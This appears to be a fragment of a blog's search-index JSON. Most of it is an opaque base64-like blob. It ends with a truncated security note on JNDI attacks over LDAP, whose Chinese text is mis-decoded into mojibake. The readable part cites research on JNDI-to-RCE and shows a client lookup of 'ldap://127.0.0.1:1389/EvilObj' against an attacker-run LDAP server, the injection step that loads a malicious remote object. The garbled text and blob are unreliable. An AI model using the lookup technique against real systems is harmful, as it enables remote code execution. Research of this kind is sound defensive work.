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"},{"title":"ã€notesã€‘JNDI with LDAP","permalink":"http://blog.0kami.cn/2020/03/01/jndi-with-ldap/","text":"0x00 å‰è¨€JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD 0x01 LDAPåŸºç¡€å…³äºLDAPçš„ä»‹ç»ï¼Œå»¶ä¼¸é˜…è¯»ä¸€ä¸‹è¿™ç¯‡ LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory: â— Using Java serialization o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.htmlâ— Using JNDI References o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html from https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf Javaä¸­çš„LDAPå¯ä»¥åœ¨å±æ€§å€¼ä¸­å­˜å‚¨ç›¸å…³çš„Javaå¯¹è±¡ï¼Œå¯ä»¥å­˜å‚¨å¦‚ä¸Šä¸¤ç§å¯¹è±¡ï¼Œè€Œç›¸å…³çš„é—®é¢˜å°±æ˜¯å‡ºç°åœ¨è¿™éƒ¨åˆ†ä¸Šã€‚ åæ–‡ç”¨çš„LDAP Serverå‚è€ƒçš„æ˜¯mbechler å®ç°çš„LDAPRefServerï¼Œè¿æ¥çš„å®¢æˆ·ç«¯Clientç›´æ¥ç”¨JNDIçš„lookupå®Œæˆï¼Œjdkç‰ˆæœ¬jdk8u162 123Context ctx = new InitialContext();ctx.lookup(\"ldap://127.0.0.1:1389/EvilObj\");ctx.close(); 0x02 LDAP with JDNI ReferencesJNDIå‘èµ·ldapçš„lookupåï¼Œå°†æœ‰å¦‚ä¸‹çš„è°ƒç”¨æµç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æ¥å…³æ³¨ï¼Œè·å¾—è¿œç¨‹LDAP Serverçš„Entryä¹‹åï¼ŒClientè¿™è¾¹æ˜¯æ€ä¹ˆåšå¤„ç†çš„ 